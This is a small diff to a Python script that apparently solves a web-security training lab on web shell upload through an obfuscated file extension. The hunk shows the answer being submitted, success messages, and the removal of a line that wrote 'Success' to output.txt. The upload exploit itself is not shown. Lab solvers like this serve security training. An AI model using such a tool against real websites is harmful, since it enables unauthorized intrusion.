@@ -37,8 +37,6 @@ def Web_shell_upload_via_obfuscated_file_extension(s, url):
             print(Fore.GREEN + f'[+] Answer is {r.text}')
             r = s.post(url + '/submitSolution',data={'answer':r.text}, verify=False, proxies=proxies)
             print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
-            with open("output.txt", "w") as file:
-                file.write("Success")
             return True
         else:
             print(Fore.RED +'[-] Unable to get the answer') 
